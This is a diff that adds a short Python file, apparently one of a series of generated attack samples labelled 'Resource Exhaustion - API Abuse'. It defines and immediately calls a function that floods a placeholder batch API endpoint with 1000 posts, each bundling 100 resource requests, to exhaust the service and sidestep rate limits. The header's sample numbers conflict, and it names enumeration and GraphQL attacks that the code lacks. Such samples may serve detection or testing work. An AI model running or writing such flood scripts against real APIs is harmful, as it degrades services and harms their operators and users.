@@ -1,0 +1,17 @@
+# Resource Exhaustion - API Abuse Sample 14
+# Created: 2026-03-30T22:24:11.730414
+# Type: API Rate Limit Bypass / Enumeration / GraphQL Deep Query
+
+# API Batch Request Flood - Sample 8
+def batch_flood():
+    batch_url = "https://api.example.com/batch"
+    for batch_num in range(1000):
+        batch_data = {
+            "requests": [
+                {"method": "GET", "url": f"/resource/{i}"}
+                for i in range(100)
+            ]
+        }
+        requests.post(batch_url, json=batch_data)
+        
+batch_flood()
